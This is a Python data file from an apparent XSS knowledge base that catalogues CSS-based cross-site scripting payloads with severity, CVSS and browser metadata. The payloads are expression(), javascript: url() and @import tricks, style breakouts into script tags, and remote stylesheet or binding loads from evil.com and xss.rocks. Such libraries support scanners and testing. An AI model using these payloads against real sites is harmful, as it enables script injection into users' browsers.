#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

CSS-based XSS Payloads
"""

from ..models import PayloadEntry


CSS_XSS_PAYLOADS = {
    # CSS expression (legacy IE)
    "css_expression_1": PayloadEntry(
        payload='<div style="width:expression(alert(1))">',
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.0,
        description="CSS expression (IE6-7)",
        tags=["css", "expression", "legacy", "ie"],
        browser_support=["ie"],
        reliability="low",
    ),
    "css_expression_2": PayloadEntry(
        payload="<style>*{x:expression(alert(1))}</style>",
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.0,
        description="CSS expression in style block",
        tags=["css", "expression", "legacy", "ie"],
        browser_support=["ie"],
        reliability="low",
    ),
    # CSS url() with javascript
    "css_url_1": PayloadEntry(
        payload='<div style="background:url(javascript:alert(1))">',
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.0,
        description="CSS url() with javascript (legacy)",
        tags=["css", "url", "javascript", "legacy"],
        browser_support=["ie"],
        reliability="low",
    ),
    # CSS behavior
    "css_behavior_1": PayloadEntry(
        payload='<div style="behavior:url(xss.htc)">',
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.5,
        description="CSS behavior property (IE)",
        tags=["css", "behavior", "htc", "ie"],
        browser_support=["ie"],
        reliability="low",
    ),
    # CSS @import
    "css_import_1": PayloadEntry(
        payload="<style>@import 'javascript:alert(1)';</style>",
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.0,
        description="CSS @import with javascript",
        tags=["css", "import", "javascript"],
        browser_support=["ie"],
        reliability="low",
    ),
    "css_import_2": PayloadEntry(
        payload="<style>@import url(https://evil.com/xss.css);</style>",
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.5,
        description="CSS @import external stylesheet",
        tags=["css", "import", "external"],
        reliability="high",
    ),
    # CSS injection via font-family
    "css_font_1": PayloadEntry(
        payload="<style>*{font-family:'}<img src=x onerror=alert(1)>'}</style>",
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.5,
        description="CSS font-family breakout",
        tags=["css", "font-family", "breakout"],
        reliability="medium",
    ),
    # CSS var() injection
    "css_var_1": PayloadEntry(
        payload="<style>:root{--x:'</style><script>alert(1)</script>'}</style>",
        contexts=["html_content", "css"],
        severity="critical",
        cvss_score=8.5,
        description="CSS variable breakout to script",
        tags=["css", "variable", "breakout", "modern"],
        reliability="medium",
    ),
    # CSS content injection
    "css_content_1": PayloadEntry(
        payload="<style>.x::before{content:'</style><img src=x onerror=alert(1)>'}</style><div class=x>",
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.5,
        description="CSS content property breakout",
        tags=["css", "content", "breakout", "pseudo-element"],
        reliability="medium",
    ),
    # CSS -moz-binding (Firefox legacy)
    "css_moz_binding": PayloadEntry(
        payload='<div style="-moz-binding:url(xss.xml#xss)">',
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.5,
        description="CSS -moz-binding (Firefox legacy)",
        tags=["css", "moz-binding", "firefox", "legacy"],
        browser_support=["firefox"],
        reliability="low",
    ),
    # === OWASP CSS Payloads ===
    "owasp-list-style": PayloadEntry(
        payload="<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
        contexts=["html_content", "css"],
        severity="medium",
        cvss_score=6.0,
        description="List-style-image with javascript URL",
        tags=["owasp", "css", "list-style", "legacy"],
        reliability="low",
    ),
    "owasp-style-background": PayloadEntry(
        payload='<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
        contexts=["html_content", "css"],
        severity="medium",
        cvss_score=6.0,
        description="Firefox -moz-binding",
        tags=["owasp", "style", "moz-binding", "firefox"],
        reliability="low",
        browser_support=["firefox"],
    ),
    "owasp-remote-stylesheet-1": PayloadEntry(
        payload='<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="Remote stylesheet with javascript",
        tags=["owasp", "link", "stylesheet"],
        reliability="low",
    ),
    "owasp-remote-stylesheet-2": PayloadEntry(
        payload="<STYLE>@import'http://xss.rocks/xss.css';</STYLE>",
        contexts=["html_content", "css"],
        severity="high",
        cvss_score=7.5,
        description="CSS @import for remote stylesheet",
        tags=["owasp", "style", "import", "remote"],
        reliability="medium",
    ),
}

CSS_XSS_PAYLOADS_TOTAL = len(CSS_XSS_PAYLOADS)
